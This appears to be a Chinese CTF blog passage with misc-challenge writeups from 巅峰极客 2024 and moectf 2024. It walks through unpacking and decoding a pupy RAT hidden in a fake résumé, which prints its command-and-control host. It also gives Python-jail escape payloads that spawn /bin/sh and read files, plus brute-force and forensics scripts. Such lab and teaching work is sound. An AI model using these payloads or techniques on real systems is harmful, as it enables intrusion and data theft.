英语教师简历.png.zip，解压能拿到一个可执行文件 张小可 英语教师简历.png.exe，010打开能看到很多UPX：\n先进行UPX脱壳，脱完了放到微步云沙箱里看看，说是可疑文件，但也没找到什么信息，于是试着分离一下文件：\n能看到脱完壳后的文件里是有一张PNG图片的，foremost提取出来：\n再试着用zsteg查一下有没有隐写：\n里面有个网址，输到url栏里发现是可以下载 default.a 文件的，同样放入010里，发现里面有好多yyttddd，显然是异常的，试着将整个文件异或yyttddd，可以拿到一个MZ可执行文件：\n想着这应该就是木马了，把这个放到微步云沙箱里，检测为恶意程序了，同时在Win7 64bit下能发现有ICMP的网络行为，但是算出ip的md5并提交却是错误的，比赛的时候就一直卡在这里了\n赛后也是看了一些此题的wp，发现这是pupy木马，其实微步也有标注木马类型，不过当时根本没注意到（\n虽然这里是Patpoopy，但是搜搜关于这个木马的资料，就会发现也被称为pupy：\n之后就是在网上找个脚本解一下木马里的内容即可，github上有对应的decoder(https://github.com/CaledoniaProject/pupyrat-config-decoder)：\n照着README环境安装好像有点问题，直接把main.py里的关键代码拿出来自己解一下就行了：\nimport pylzma import marshal def decode_pupyrat(filename): data = None with open(filename, \u0026#39;rb\u0026#39;) as f: data = f.read() index = data.find(b\u0026#39;\\x5d\\x00\\x00\\x80\\x00\\x00\u0026#39;) if not index: print(\u0026#34;LZMA signature not found, skipped\u0026#34;) return data = pylzma.decompress(data[index:]) tmp = marshal.loads(data) print (tmp) decode_pupyrat(\u0026#34;download.exe\u0026#34;) 运行结果：\n{\u0026#39;launcher_args\u0026#39;: [b\u0026#39;--host\u0026#39;, b\u0026#39;60.177.118.44:3432\u0026#39;, b\u0026#39;-t\u0026#39;, b\u0026#39;ssl\u0026#39;], \u0026#39;cid\u0026#39;: 1134523535, \u0026#39;launcher\u0026#39;: b\u0026#39;connect\u0026#39;, \u0026#39;delays\u0026#39;: [(10, 5, 10), (50, 30, 50), (-1, 150, 300)], \u0026#39;debug\u0026#39;: False, \u0026#39;credentials\u0026#39;: {\u0026#39;SSL_BIND_CERT\u0026#39;: ...... ...... (\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00s\\x17\\x00\\x00\\x00network/lib/msgtypes.pyt\\x08\\x00\\x00\\x00\u0026lt;module\u0026gt;\\x04\\x00\\x00\\x00s\u0026amp;\\x00\\x00\\x00\\x00\\x01\\x06\\x03\\x10\\x02\\x10\\x02\\x10\\x01\\x10\\x01\\x16\\x02\\x1c\\x03\\x06\\x01\\x06\\x03\\x12\\x04\\t\\x06\\t\\x05\\x19\\x01\\x11\\x02\\x0c\\x02%\\x01\\x14\\x03\\x0f\\x02\u0026#39;}] ip为 60.177.118.44 ，md5值为 b57758d5acc923137eef453239ba685b\nflag{b57758d5acc923137eef453239ba685b}\n","permalink":"https://blog.w8nn9z.top/posts/ctf/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-2024-misc-writeup/","summary":"","title":"巅峰极客 2024 MISC Writeup"},{"content":"杂项入门指北 海报右侧有一段摩斯密码 moectf{H4VE_A_G00D_T1ME}\nsignin 直接先给所有人全签个到，再把luo改成缺勤即可完成任务拿到flag\nmoectf{Thanks_For_You_signing_in_4ND_W3l0c0me_T0_M0ecTf_2024!!!}\n罗小黑战记 WPS图片可以直接逐帧看，其中有个二维码，扫码出flag\nmoectf{y0uu6r3th3m0st3r1nth1sf13ld}\nez_F5 F5算法加密的jpg图片，winhex打开就能看到有一段base32，解码内容和base32之后的内容一致，no_password\n可以直接用F5-steganography一把梭 https://github.com/matthewgao/F5-steganography\n一开始还以为没密码，后来发现密码就是no_password，不过要注意java版本不能太高\njava Extract suantouwangba.jpg -p no_password 可以在output.txt中看到解密的内容：moectf{F5_15_s0_lntere5t1n9}\n捂住一只耳 daylight音频直接听能听到一串数字 63 31 43 31 41 52 31 51 71 101\n看了提示，知道数字是只和键盘字母有关的坐标，一一对应起来，注意开大写锁定caps\nmoectf{NEVERGIVEUP}\nreadme /proc/pid目录中存在关于pid进程的信息，通过文件描述符fd即/proc/pid/fd/3可以读取未被关闭的文件内容，若是当前进程，则pid可以是self，故通过/proc/self/fd/3即可读取当前进程下第一个打开但未关闭的文件/tmp/therealflag中的内容，即使原文件被删除了\nmoejail_lv1 可以直接拿shell，然后找找flag在哪，发现被隐藏/tmp目录下，flag文件名字很长可以用通配符*替代\nGive me your payload:__import__(\u0026#39;os\u0026#39;).system(\u0026#34;/bin/sh\u0026#34;) ls /tmp -al total 12 drwxrwxrwt 1 root root 4096 Aug 16 11:18 . drwxr-xr-x 1 root root 4096 Aug 16 11:18 .. -rw-r--r-- 1 1000 root 63 Aug 16 11:18 .therealflag_c7d07b4afdbfcc56e4a5c8066159380c85fe7bdb76da1ebad9f3622bba21f423ad5972ff2720a7b8f03903e883b49782afc9efa4d50144b1e0973cc6a421a6f4 - cat /tmp/.t* moectf{Ah_h4-NOw_YOU_Know_hoW_tO-3ScaPe_5ImPL3-STRINg_flLter0} ctfer2077① 如果直接扫码会得到一串内容，有个BV号，看了就会发现被骗了（\n真的flag内容在lsb隐写里，zsteg一把梭\n解不完的压缩包 999.zip脚本解一下，到最后一层有个cccccccrc.zip，再从网上找一个crc32脚本爆破一下拿到密码pwd，解压缩包拿flag\nimport zipfile import os save_path = \u0026#34;./zip\u0026#34; for i in range(999,0,-1): zip_path=\u0026#34;./zip/{}.zip\u0026#34;.format(i) file=zipfile.ZipFile(zip_path) file.extractall(save_path) file.close() os.remove(\u0026#34;./zip/{}.zip\u0026#34;.format(i)) import binascii import string def crack_crc(): print(\u0026#39;-------------Start Crack CRC-------------\u0026#39;) crc_list = [0xf812a17e, 0x43dfeaa4, 0xc617bdf4, 0x1db1c332]#文件的CRC32值列表，注意顺序 comment = \u0026#39;\u0026#39; chars = string.printable for crc_value in crc_list: for char1 in chars: for char2 in chars: res_char = char1 + char2#获取遍历的任意2Byte字符 char_crc = binascii.crc32(res_char.encode())#获取遍历字符的CRC32值 calc_crc = char_crc \u0026amp; 0xffffffff#将获取到的字符的CRC32值与0xffffffff进行与运算 if calc_crc == crc_value:#将获取字符的CRC32值与每个文件的CRC32值进行匹配 print(\u0026#39;[+] {}: {}\u0026#39;.format(hex(crc_value),res_char)) comment += res_char print(\u0026#39;-----------CRC Crack Completed-----------\u0026#39;) print(\u0026#39;Result: {}\u0026#39;.format(comment)) if __name__ == \u0026#39;__main__\u0026#39;: crack_crc() moectf{af9c688e-e0b9-4900-879c-672b44c550ea}\nthe_secret_of_snowball jpg文件头有问题，改成FF D8，图片正常打开就能看到前一段flag了，文件尾有一串base64，直接解拿到后半段flag\nmoectf{Welc0me_t0_the_secret_life_0f_Misc!}\n每人至少300份 二维码碎片很友好，从中间切的，还没有旋转，二维码可以直接拼出来：\n扫描得到一串神必内容：\nbalabalballablblablbalablbalballbase58lblblblblllblblblblbalblbdjshjshduieyrfdrpieuufghdjhgfjhdsgfsjhdgfhjdsghjgfdshjgfhjdgfhgdh///key{3FgQG9ZFteHzw7W42}?? {}里的内容解base58得到we1rd_qrc0d3，一开始还以为是key\n直接跑去解密encode.txt了，光解密英文字符部分就发现端倪了，三段分别对应firstrow，secondrow，thirdrow，一共9个数字想着肯定是二维码碎片的拼接顺序了，直接把flag交了，之后又研究了一下，写了个解密脚本\ndef self_decoding(output_text): code_setting_first = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; output_text = output_text.split(\u0026#34; \u0026#34;) decoded_text = \u0026#34;\u0026#34; for x in output_text: if x in code_setting_first: if ord(x) \u0026gt; 116: num = ord(x) - 19 x = chr(num) decoded_text += x elif ord(x) \u0026lt; 102 and ord(x) \u0026gt; 96: num = ord(x) + 19 x = chr(num) decoded_text += x elif 104 \u0026lt;= ord(x) \u0026lt;= 115: num = 219 - ord(x) x = chr(num) decoded_text += x #明文加密时尾部数字没变，从尾部开始异或回去 number_setting = \u0026#34;0123456789\u0026#34; n3 = output_text[-1] n2 = str(int(output_text[-2]) ^ int(n3)) n1 = str(int(output_text[-3]) ^ int(n2)) decoded_text += n1 + n2 + n3 return decoded_text def reverse_decoding(input_text): output_text = input_text[::-1] return output_text if __name__ == \u0026#34;__main__\u0026#34;: encoded_text1 = \u0026#34;7 3 5 d l i a h i r y\u0026#34; encoded_text2 = \u0026#34;6 5 1 d l i w m l v x h\u0026#34; encoded_text3 = \u0026#34;9 1 31 d l i w i r s a\u0026#34; print(self_decoding(reverse_decoding(encoded_text1))) print(self_decoding(reverse_decoding(encoded_text2))) print(self_decoding(reverse_decoding(encoded_text3))) 运行结果：\nfirstrow147 secondrow236 thirdrow589 moectf{we1rd_qrc0d3}\nThe upside and down 拿到一个.hex后缀的文件，但是内容和intel hex文件没啥关系，结合题目名，试着把每个字节的hex值左右两位交换顺序，试试前几个字节就能发现是逆置的png尾，于是就想到把所有字节都反序，然后再逆置整个文件即可，010Editor和winhex里都没找到方便反序字节的工具，直接写脚本了\nwith open(\u0026#34;./the_upside_and_down.hex\u0026#34;,\u0026#34;rb+\u0026#34;) as f: data = f.read() for i in range(len(data)): hex_num = hex(data[i]).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;).rjust(2,\u0026#34;0\u0026#34;) hex_num_reverse = hex_num[::-1] reverse_byte = chr(int(hex_num_reverse,base=16)).encode(\u0026#34;latin\u0026#34;) f.seek(i) f.write(reverse_byte) f.flush() with open(\u0026#34;./the_upside_and_down.hex\u0026#34;,\u0026#34;rb+\u0026#34;) as ff: new_data = ff.read() with open(\u0026#34;flag.png\u0026#34;,\u0026#34;wb+\u0026#34;) as fff: fff.write(new_data[::-1]) flag.png是一张二维码，扫描可以得到：\nwhere_is_the_flag? https://balabala_towards:moectf{Fri3nds_d0n\u0026#39;t_lie!}// Find It 一道社工题，贴个原图先：\n图片上能看到桔子水晶酒店和美居酒店，再结合提示“的”还是“的”，地图上多搜搜，能找到吉的堡幼儿园\nmoectf{ji_di_bao_you_er_yuan}\nez_Forensics 看看cmd记录就行\npath\u0026gt;volatility26.exe -f flag.raw --profile=Win7SP1x64 cmdscan Volatility Foundation Volatility Framework 2.6 ************************************************** CommandProcess: conhost.exe Pid: 2268 CommandHistory: 0x32b0a0 Application: cmd.exe Flags: Allocated, Reset CommandCount: 3 LastAdded: 2 LastDisplayed: 2 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x60 Cmd #0 @ 0x330410: echo moectf{WWBGY-TLVC5-XKYBZ} \u0026gt; flag.txt Cmd #1 @ 0x30cec0: echo SJW7O^%gt8 \u0026gt; flag.txt Cmd #2 @ 0x3350b0: del flag.txt ************************************************** CommandProcess: conhost.exe Pid: 904 CommandHistory: 0x19b0a0 Application: DumpIt.exe Flags: Allocated CommandCount: 0 LastAdded: -1 LastDisplayed: -1 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x60 ctfer2077② volume是加密挂载卷，密码是题目描述里的核心价值观解密内容：\n法治富强自由富强和谐平等和谐平等法治法治和谐富强法治文明公正自由 p@55w0rd VeraCrypt成功挂载后能拿到一个flag.txt，但是里面没内容，考虑到是个磁盘，想到可能是NTFS数据流隐写：\nA:\\\u0026gt;dir /r 驱动器 A 中的卷没有标签。 卷的序列号是 F61A-E148 A:\\ 的目录 2024/07/28 20:54 18 flag？.txt 82 flag？.txt:小鹤.txt:$DATA 1 个文件 18 字节 0 个目录 1,064,960 可用字节 notepad打开：\nA:\\\u0026gt;notepad flag？.txt:小鹤.txt ulpb vfde hfyz yisi buuima key jqui xxmm vedrhx de qrpb xnxp ulpb ui veyh dazide 结合文件名小鹤，找到个小鹤双拼输入法，照着打就能知道大概内容了：\n双品 真得 很有 意思 不是吗 key 就是 下面 折断话 得 全品 笑些 双拼 事 着样 打字得 flag是上面这段话的全拼小写：\nmoectf{shuangpinshizheyangdazide}\n拼图羔手 直接拼二维码碎片拿到加密的flag：\nbalabalbalablbalblablbalabala//nihaopintugaoshou//encoded_flag{71517ysd%ryxsc!usv@ucy*wqosy*qxl\u0026amp;sxl*sbys^wb$syqwp$ysyw!qpw@hs} 根据 encode.py 写出 decode.py 拿到key和解密后的flag：\nfrom base64 import b64decode as bd def self_decoding(input_text): code_setting_first = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; code_setting_sec = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; number_setting = \u0026#34;0123456789\u0026#34; decoded_text= \u0026#34;\u0026#34; for x in input_text: if x in code_setting_first: if ord(x) \u0026lt; 123 and ord(x) \u0026gt; 115: num = ord(x) - 19 elif ord(x) \u0026gt; 96 and ord(x) \u0026lt; 104: num = ord(x) + 19 elif 104 \u0026lt;= ord(x) \u0026lt;= 115: num = 219 - ord(x) decoded_text += chr(num) elif x in code_setting_sec: if 64 \u0026lt; ord(x) \u0026lt; 72: num = ord(x) + 7 elif 71 \u0026lt; ord(x) \u0026lt; 79: num = ord (x) - 7 elif 78 \u0026lt; ord(x) \u0026lt; 82: num = ord(x) + 9 elif 87 \u0026lt; ord(x) \u0026lt; 91: num = ord(x) - 9 elif 81 \u0026lt; ord(x) \u0026lt; 88: num = 168 - ord(x) decoded_text += chr(num) else: decoded_text += x if decoded_text[-1] not in number_setting: return decoded_text decoded_text = list(decoded_text) tmp = \u0026#34;7\u0026#34; for i in range(len(input_text)-2,len(input_text)-6,-1): decoded_text[i] = str(int(input_text[i]) ^ int(tmp)) tmp = decoded_text[i] return \u0026#34;\u0026#34;.join(decoded_text) def reverse_decoding(input_text): output_text = input_text[::-1] return output_text def strange_character_hint(key): key = reverse_decoding(self_decoding(key)) return key if __name__==\u0026#34;__main__\u0026#34;: cipherkey = b\u0026#39;eGl4c2R4bmxVbVhpeHVuYkdzYXJkZnRhVWl4YXZ0aXRzSnh6bXRpYVU=\u0026#39; print(strange_character_hint(bd(cipherkey).decode())) ciphertext = r\u0026#34;71517ysd%ryxsc!usv@ucy*wqosy*qxl\u0026amp;sxl*sbys^wb$syqwp$ysyw!qpw@hs\u0026#34; print(self_decoding(reverse_decoding(ciphertext))) 运行结果：\nStrangeCharacterStaywithNumberOnSomewhere hs@dkj!dfhf$kdjfh$ud^hfuh*oeh\u0026amp;oej*fhljd*fvb@chb!vhefi%whf52367 hint的意思可能是说flag中@这种字符应该对应键盘上的数字：\nhs2dkj1dfhf4kdjfh4ud6hfuh8oeh7oej8fhljd8fvb2chb1vhefi5whf52367 唉，对着这串字符想了好久好久好久，最后发现flag是这段东西包上moectf{}\nmoejail_lv2 感觉和lv1没啥区别，说是过滤了字符，直接cat flag文件了也没测（\nGive me your code: __import__(\u0026#39;os\u0026#39;).system(\u0026#39;ls -al /tmp\u0026#39;) total 12 drwxrwxrwt 1 root root 4096 Aug 26 11:11 . drwxr-xr-x 1 root root 4096 Aug 26 11:11 .. -rw-r--r-- 1 root root 57 Aug 26 11:11 therealflag_35173e1253a15fb3d5d15efdc930eb8e Nope 馃え Are you robot? Please enter \u0026#39;FMMG8H\u0026#39;+\u0026#39;F9BUG2\u0026#39;=? to continue: FMMG8HF9BUG2 Give me your code: __import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat /tmp/therealflag_35*\u0026#39;) moectf{yOu-caN-BYPa5S-THe_Str1NG_fIITEr-6Y_NUm_t0-ChR30} 我的图层在你之上 文件尾有个网址，打开分离图层，黑的那层图片导出后，stegsolve里翻翻可以看到 key=p_w_d\n用这个key解压缩包，之后解凯撒就行\nzbrpgs{q751894o-rr0n-47qq-85q4-r92q0443921s} moectf{d751894b-ee0a-47dd-85d4-e92d0443921f} 时光穿梭机 1946年4月20日的伦敦 + 当地知名的画报 ==\u0026gt; Illustrated London News：\n在这个news里面筛选时间 1946/4/20 + tomb ，能找到一篇重合度极高的画报：\nhttps://www.britishnewspaperarchive.co.uk/viewer/bl/0001578/19460420/043/0015\n读读能知道是王建墓，百度百科里信息基本和画报符合，高德地图看看就找到中医馆了：\nmoectf{han_fang_tang}\nctfer2077③ 流量里http协议传了个zip，导出解压拿到一个gif，一个zip，一个mp3，gif有一帧里能看到key：\nmp3听听没啥问题，直接试试MP3stego，解出个brainfuck：\n+++++ +++[- \u0026gt;++++ ++++\u0026lt; ]\u0026gt;+++ +++++ .\u0026lt;+++ +[-\u0026gt;- ---\u0026lt;] \u0026gt;---. \u0026lt;++++ +++[- \u0026gt;++++ +++\u0026lt;] \u0026gt;+.\u0026lt;+ ++++[ -\u0026gt;--- --\u0026lt;]\u0026gt; ----- -.\u0026lt;++ +[-\u0026gt;+ ++\u0026lt;]\u0026gt; +++++ +.\u0026lt;++ +[-\u0026gt;- --\u0026lt;]\u0026gt; -.\u0026lt;++ ++[-\u0026gt; ----\u0026lt; ]\u0026gt;--- -.\u0026lt;++ ++++[ -\u0026gt;+++ +++\u0026lt;] \u0026gt;++++ +.\u0026lt; 解出来新的key：\nH5gHWM9b 拿去解压zip，里面三段flag，是福尔摩斯里跳舞的小人密码，不过感觉画的不是很规范，那个P字母完全是猜出来的，最后猜出flag，这是其中一段：\nmoectf{PEOPLE_DANCING_HAPPILY}\nez_usbpcap usb流量，用tshark提取出键盘的 usbhid data ：\ntshark -r flag.pcapng -T fields -Y \u0026#34;usb.src==2.1.1\u0026#34; -e usbhid.data \u0026gt; usb.txt 提取出的 usb.txt 内容，：\n00005e0000000000 0000000000000000 0000070000000000 0000000000000000 00005e0000000000 0000000000000000 0000090000000000 0000000000000000 00005e0000000000 0000000000000000 00005d0000000000 0000000000000000 00005e0000000000 0000000000000000 00005b0000000000 0000000000000000 00005f0000000000 0000000000000000 00005c0000000000 0000000000000000 00005e0000000000 0000000000000000 00005e0000000000 0000000000000000 00005f0000000000 0000000000000000 0000050000000000 0000000000000000 00005e0000000000 0000000000000000 0000080000000000 0000000000000000 00005b0000000000 0000000000000000 0000590000000000 0000000000000000 00005e0000000000 0000000000000000 0000600000000000 0000000000000000 00005e0000000000 0000000000000000 0000590000000000 0000000000000000 00005b0000000000 0000000000000000 0000620000000000 0000000000000000 00005f0000000000 0000000000000000 00005f0000000000 0000000000000000 00005b0000000000 0000000000000000 0000620000000000 0000000000000000 00005f0000000000 0000000000000000 0000610000000000 0000000000000000 00005b0000000000 0000000000000000 0000620000000000 0000000000000000 00005f0000000000 0000000000000000 00005d0000000000 0000000000000000 00005e0000000000 0000000000000000 00005c0000000000 0000000000000000 00005e0000000000 0000000000000000 0000610000000000 0000000000000000 00005e0000000000 0000000000000000 0000590000000000 0000000000000000 00005e0000000000 0000000000000000 0000080000000000 0000000000000000 00005e0000000000 0000000000000000 0000060000000000 0000000000000000 00005b0000000000 0000000000000000 00005b0000000000 0000000000000000 00005b0000000000 0000000000000000 00005a0000000000 0000000000000000 00005b0000000000 0000000000000000 00005c0000000000 0000000000000000 00005b0000000000 0000000000000000 00005d0000000000 0000000000000000 00005b0000000000 0000000000000000 0000590000000000 0000000000000000 00005f0000000000 0000000000000000 0000070000000000 0000000000000000 可以看到里面有一些不常见的data值，比如5e，自己从码表里找出对应键盘按键再补到脚本里去即可：\nnormalKeys = {\u0026#34;04\u0026#34;: \u0026#34;a\u0026#34;, \u0026#34;05\u0026#34;: \u0026#34;b\u0026#34;, \u0026#34;06\u0026#34;: \u0026#34;c\u0026#34;, \u0026#34;07\u0026#34;: \u0026#34;d\u0026#34;, \u0026#34;08\u0026#34;: \u0026#34;e\u0026#34;, \u0026#34;09\u0026#34;: \u0026#34;f\u0026#34;, \u0026#34;0a\u0026#34;: \u0026#34;g\u0026#34;, \u0026#34;0b\u0026#34;: \u0026#34;h\u0026#34;, \u0026#34;0c\u0026#34;: \u0026#34;i\u0026#34;, \u0026#34;0d\u0026#34;: \u0026#34;j\u0026#34;, \u0026#34;0e\u0026#34;: \u0026#34;k\u0026#34;, \u0026#34;0f\u0026#34;: \u0026#34;l\u0026#34;, \u0026#34;10\u0026#34;: \u0026#34;m\u0026#34;, \u0026#34;11\u0026#34;: \u0026#34;n\u0026#34;, \u0026#34;12\u0026#34;: \u0026#34;o\u0026#34;, \u0026#34;13\u0026#34;: \u0026#34;p\u0026#34;, \u0026#34;14\u0026#34;: \u0026#34;q\u0026#34;, \u0026#34;15\u0026#34;: \u0026#34;r\u0026#34;, \u0026#34;16\u0026#34;: \u0026#34;s\u0026#34;, \u0026#34;17\u0026#34;: \u0026#34;t\u0026#34;, \u0026#34;18\u0026#34;: \u0026#34;u\u0026#34;, \u0026#34;19\u0026#34;: \u0026#34;v\u0026#34;, \u0026#34;1a\u0026#34;: \u0026#34;w\u0026#34;, \u0026#34;1b\u0026#34;: \u0026#34;x\u0026#34;, \u0026#34;1c\u0026#34;: \u0026#34;y\u0026#34;, \u0026#34;1d\u0026#34;: \u0026#34;z\u0026#34;, \u0026#34;1e\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;1f\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;20\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;21\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;22\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;23\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;24\u0026#34;: \u0026#34;7\u0026#34;, \u0026#34;25\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;26\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;27\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;28\u0026#34;: \u0026#34;\u0026lt;RET\u0026gt;\u0026#34;, \u0026#34;29\u0026#34;: \u0026#34;\u0026lt;ESC\u0026gt;\u0026#34;, \u0026#34;2a\u0026#34;: \u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;, \u0026#34;2b\u0026#34;: \u0026#34;\\t\u0026#34;, \u0026#34;2c\u0026#34;: \u0026#34;\u0026lt;SPACE\u0026gt;\u0026#34;, \u0026#34;2d\u0026#34;: \u0026#34;-\u0026#34;, \u0026#34;2e\u0026#34;: \u0026#34;=\u0026#34;, \u0026#34;2f\u0026#34;: \u0026#34;[\u0026#34;, \u0026#34;30\u0026#34;: \u0026#34;]\u0026#34;, \u0026#34;31\u0026#34;: \u0026#34;\\\\\u0026#34;, \u0026#34;32\u0026#34;: \u0026#34;\u0026lt;NON\u0026gt;\u0026#34;, \u0026#34;33\u0026#34;: \u0026#34;;\u0026#34;, \u0026#34;34\u0026#34;: \u0026#34;\u0026#39;\u0026#34;, \u0026#34;35\u0026#34;: \u0026#34;\u0026lt;GA\u0026gt;\u0026#34;, \u0026#34;36\u0026#34;: \u0026#34;,\u0026#34;, \u0026#34;37\u0026#34;: \u0026#34;.\u0026#34;, \u0026#34;38\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;39\u0026#34;: \u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;, \u0026#34;3a\u0026#34;: \u0026#34;\u0026lt;F1\u0026gt;\u0026#34;, \u0026#34;3b\u0026#34;: \u0026#34;\u0026lt;F2\u0026gt;\u0026#34;, \u0026#34;3c\u0026#34;: \u0026#34;\u0026lt;F3\u0026gt;\u0026#34;, \u0026#34;3d\u0026#34;: \u0026#34;\u0026lt;F4\u0026gt;\u0026#34;, \u0026#34;3e\u0026#34;: \u0026#34;\u0026lt;F5\u0026gt;\u0026#34;, \u0026#34;3f\u0026#34;: \u0026#34;\u0026lt;F6\u0026gt;\u0026#34;, \u0026#34;40\u0026#34;: \u0026#34;\u0026lt;F7\u0026gt;\u0026#34;, \u0026#34;41\u0026#34;: \u0026#34;\u0026lt;F8\u0026gt;\u0026#34;, \u0026#34;42\u0026#34;: \u0026#34;\u0026lt;F9\u0026gt;\u0026#34;, \u0026#34;43\u0026#34;: \u0026#34;\u0026lt;F10\u0026gt;\u0026#34;, \u0026#34;44\u0026#34;: \u0026#34;\u0026lt;F11\u0026gt;\u0026#34;, \u0026#34;45\u0026#34;: \u0026#34;\u0026lt;F12\u0026gt;\u0026#34;, \u0026#34;59\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;5a\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;5b\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;5c\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;5d\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;5e\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;5f\u0026#34;: \u0026#34;7\u0026#34;, \u0026#34;60\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;61\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;62\u0026#34;: \u0026#34;0\u0026#34;} shiftKeys = {\u0026#34;04\u0026#34;: \u0026#34;A\u0026#34;, \u0026#34;05\u0026#34;: \u0026#34;B\u0026#34;, \u0026#34;06\u0026#34;: \u0026#34;C\u0026#34;, \u0026#34;07\u0026#34;: \u0026#34;D\u0026#34;, \u0026#34;08\u0026#34;: \u0026#34;E\u0026#34;, \u0026#34;09\u0026#34;: \u0026#34;F\u0026#34;, \u0026#34;0a\u0026#34;: \u0026#34;G\u0026#34;, \u0026#34;0b\u0026#34;: \u0026#34;H\u0026#34;, \u0026#34;0c\u0026#34;: \u0026#34;I\u0026#34;, \u0026#34;0d\u0026#34;: \u0026#34;J\u0026#34;, \u0026#34;0e\u0026#34;: \u0026#34;K\u0026#34;, \u0026#34;0f\u0026#34;: \u0026#34;L\u0026#34;, \u0026#34;10\u0026#34;: \u0026#34;M\u0026#34;, \u0026#34;11\u0026#34;: \u0026#34;N\u0026#34;, \u0026#34;12\u0026#34;: \u0026#34;O\u0026#34;, \u0026#34;13\u0026#34;: \u0026#34;P\u0026#34;, \u0026#34;14\u0026#34;: \u0026#34;Q\u0026#34;, \u0026#34;15\u0026#34;: \u0026#34;R\u0026#34;, \u0026#34;16\u0026#34;: \u0026#34;S\u0026#34;, \u0026#34;17\u0026#34;: \u0026#34;T\u0026#34;, \u0026#34;18\u0026#34;: \u0026#34;U\u0026#34;, \u0026#34;19\u0026#34;: \u0026#34;V\u0026#34;, \u0026#34;1a\u0026#34;: \u0026#34;W\u0026#34;, \u0026#34;1b\u0026#34;: \u0026#34;X\u0026#34;, \u0026#34;1c\u0026#34;: \u0026#34;Y\u0026#34;, \u0026#34;1d\u0026#34;: \u0026#34;Z\u0026#34;, \u0026#34;1e\u0026#34;: \u0026#34;!\u0026#34;, \u0026#34;1f\u0026#34;: \u0026#34;@\u0026#34;, \u0026#34;20\u0026#34;: \u0026#34;#\u0026#34;, \u0026#34;21\u0026#34;: \u0026#34;$\u0026#34;, \u0026#34;22\u0026#34;: \u0026#34;%\u0026#34;, \u0026#34;23\u0026#34;: \u0026#34;^\u0026#34;, \u0026#34;24\u0026#34;: \u0026#34;\u0026amp;\u0026#34;, \u0026#34;25\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;26\u0026#34;: \u0026#34;(\u0026#34;, \u0026#34;27\u0026#34;: \u0026#34;)\u0026#34;, \u0026#34;28\u0026#34;: \u0026#34;\u0026lt;RET\u0026gt;\u0026#34;, \u0026#34;29\u0026#34;: \u0026#34;\u0026lt;ESC\u0026gt;\u0026#34;, \u0026#34;2a\u0026#34;: \u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;, \u0026#34;2b\u0026#34;: \u0026#34;\\t\u0026#34;, \u0026#34;2c\u0026#34;: \u0026#34;\u0026lt;SPACE\u0026gt;\u0026#34;, \u0026#34;2d\u0026#34;: \u0026#34;_\u0026#34;, \u0026#34;2e\u0026#34;: \u0026#34;+\u0026#34;, \u0026#34;2f\u0026#34;: \u0026#34;{\u0026#34;, \u0026#34;30\u0026#34;: \u0026#34;}\u0026#34;, \u0026#34;31\u0026#34;: \u0026#34;|\u0026#34;, \u0026#34;32\u0026#34;: \u0026#34;\u0026lt;NON\u0026gt;\u0026#34;, \u0026#34;33\u0026#34;: \u0026#34;\\\u0026#34;\u0026#34;, \u0026#34;34\u0026#34;: \u0026#34;:\u0026#34;, \u0026#34;35\u0026#34;: \u0026#34;~\u0026#34;, \u0026#34;36\u0026#34;: \u0026#34;\u0026lt;\u0026#34;, \u0026#34;37\u0026#34;: \u0026#34;\u0026gt;\u0026#34;, \u0026#34;38\u0026#34;: \u0026#34;?\u0026#34;, \u0026#34;39\u0026#34;: \u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;, \u0026#34;3a\u0026#34;: \u0026#34;\u0026lt;F1\u0026gt;\u0026#34;, \u0026#34;3b\u0026#34;: \u0026#34;\u0026lt;F2\u0026gt;\u0026#34;, \u0026#34;3c\u0026#34;: \u0026#34;\u0026lt;F3\u0026gt;\u0026#34;, \u0026#34;3d\u0026#34;: \u0026#34;\u0026lt;F4\u0026gt;\u0026#34;, \u0026#34;3e\u0026#34;: \u0026#34;\u0026lt;F5\u0026gt;\u0026#34;, \u0026#34;3f\u0026#34;: \u0026#34;\u0026lt;F6\u0026gt;\u0026#34;, \u0026#34;40\u0026#34;: \u0026#34;\u0026lt;F7\u0026gt;\u0026#34;, \u0026#34;41\u0026#34;: \u0026#34;\u0026lt;F8\u0026gt;\u0026#34;, \u0026#34;42\u0026#34;: \u0026#34;\u0026lt;F9\u0026gt;\u0026#34;, \u0026#34;43\u0026#34;: \u0026#34;\u0026lt;F10\u0026gt;\u0026#34;, \u0026#34;44\u0026#34;: \u0026#34;\u0026lt;F11\u0026gt;\u0026#34;, \u0026#34;45\u0026#34;: \u0026#34;\u0026lt;F12\u0026gt;\u0026#34;, \u0026#34;59\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;5a\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;5b\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;5c\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;5d\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;5e\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;5f\u0026#34;: 